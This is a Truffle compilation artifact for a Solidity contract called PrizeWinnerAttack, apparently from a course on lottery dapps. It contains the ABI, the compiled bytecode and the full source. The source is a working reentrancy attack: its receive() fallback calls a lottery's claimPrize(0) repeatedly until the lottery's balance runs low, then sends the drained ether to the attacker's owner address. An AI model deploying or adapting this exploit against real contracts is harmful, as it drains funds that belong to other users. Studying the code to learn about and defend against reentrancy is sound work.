{
  "contractName": "PrizeWinnerAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_lotteryContractAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "lotteryContract",
      "outputs": [
        {
          "internalType": "contract ILottery3",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "bet",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b50604051610a37380380610a378339818101604052810190610032919061010f565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100dc826100b1565b9050919050565b6100ec816100d1565b81146100f757600080fd5b50565b600081519050610109816100e3565b92915050565b600060208284031215610125576101246100ac565b5b6000610133848285016100fa565b91505092915050565b6080516108c661017160003960008181604001528181609e015281816103a1015281816104d3015261058201526108c66000f3fe6080604052600436106100385760003560e01c806311610c25146102395780639e5faafc14610243578063b29c662a1461024d57610234565b3661023457347f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16311061014e5761009c60405180606001604052806022815260200161082960229139610278565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d709815460006040518263ffffffff1660e01b81526004016100f69190610618565b600060405180830381600087803b15801561011057600080fd5b505af1158015610124573d6000803e3d6000fd5b5050505061014960405180606001604052806021815260200161080860219139610278565b610232565b61018c6040518060400160405280601881526020017f4265666f7265207472616e73666572696e672065746865720000000000000000815250610278565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101f2573d6000803e3d6000fd5b506102316040518060400160405280601781526020017f4166746572207472616e73666572696e67206574686572000000000000000000815250610278565b5b005b600080fd5b610241610311565b005b61024b610422565b005b34801561025957600080fd5b50610262610580565b60405161026f91906106a8565b60405180910390f35b61030e8160405160240161028c9190610753565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506105a4565b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461039f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610396906107e7565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166311610c25346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561040757600080fd5b505af115801561041b573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146104b0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104a7906107e7565b60405180910390fd5b6104d160405180606001604052806023815260200161086e60239139610278565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d709815460006040518263ffffffff1660e01b815260040161052b9190610618565b600060405180830381600087803b15801561054557600080fd5b505af1158015610559573d6000803e3d6000fd5b5050505061057e60405180606001604052806023815260200161084b60239139610278565b565b7f000000000000000000000000000000000000000000000000000000000000000081565b60006a636f6e736f6c652e6c6f6790508151602083016000808383865afa5050505050565b6000819050919050565b6000819050919050565b6000819050919050565b60006106026105fd6105f8846105c9565b6105dd565b6105d3565b9050919050565b610612816105e7565b82525050565b600060208201905061062d6000830184610609565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061066e61066961066484610633565b6105dd565b610633565b9050919050565b600061068082610653565b9050919050565b600061069282610675565b9050919050565b6106a281610687565b82525050565b60006020820190506106bd6000830184610699565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b838110156106fd5780820151818401526020810190506106e2565b60008484015250505050565b6000601f19601f8301169050919050565b6000610725826106c3565b61072f81856106ce565b935061073f8185602086016106df565b61074881610709565b840191505092915050565b6000602082019050818103600083015261076d818461071a565b905092915050565b7f4f6e6c79206f776e65722063616e20706572666f726d2074686973206163746960008201527f6f6e000000000000000000000000000000000000000000000000000000000000602082015250565b60006107d16022836106ce565b91506107dc82610775565b604082019050919050565b60006020820190508181036000830152610800816107c4565b905091905056fe416674657220616e6f746865722063616c6c206f6620636c61696d5072697a65204265666f726520616e6f746865722063616c6c206f6620636c61696d5072697a65204166746572207468652066697273742063616c6c206f6620636c61696d5072697a65204265666f7265207468652066697273742063616c6c206f6620636c61696d5072697a65a2646970667358221220c38c4fc3a80255ba840cf527379b7f809a905a4867bbb5da3114ac9edb2ca71364736f6c63430008110033",
  "immutableReferences": {
    "10564": [
      {
        "length": 32,
        "start": 64
      },
      {
        "length": 32,
        "start": 158
      },
      {
        "length": 32,
        "start": 929
      },
      {
        "length": 32,
        "start": 1235
      },
      {
        "length": 32,
        "start": 1410
      }
    ]
  },
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@ganache/console.log/console.sol\";\n\n\ninterface ILottery3 {\n    function bet() external payable;\n    function claimPrize(uint _week) external;\n}\n\ncontract PrizeWinnerAttack {\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can perform this action\");\n        _;\n    }\n  address owner;\n  ILottery3 public immutable lotteryContract;\n\n  constructor(address _lotteryContractAddress) {\n    lotteryContract = ILottery3(_lotteryContractAddress);\n    owner = msg.sender;\n  }\n\n  function bet() external payable onlyOwner {\n    lotteryContract.bet{value:msg.value}();\n  }\n\n  function attack() external payable onlyOwner {\n    console.log(\"Before the first call of claimPrize\"); // Triggered \n    lotteryContract.claimPrize(0);\n    console.log(\"After the first call of claimPrize \");\n  }\n\n  receive() external payable {\n    if (address(lotteryContract).balance >= msg.value) {\n      console.log(\"Before another call of claimPrize \");\n      lotteryContract.claimPrize(0);\n      console.log(\"After another call of claimPrize \");      \n    } else {\n      console.log(\"Before transfering ether\");\n      payable(owner).transfer(address(this).balance);\n      console.log(\"After transfering ether\"); \n    }\n  }\n}\n\n\n\n\n",
  "sourcePath": "/home/alex/Dapp/udemy/lottery/lottery_truffle5/truffle-files/contracts/PrizeWinnerAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.11",
  "updatedAt": "2023-04-14T20:22:55.915Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}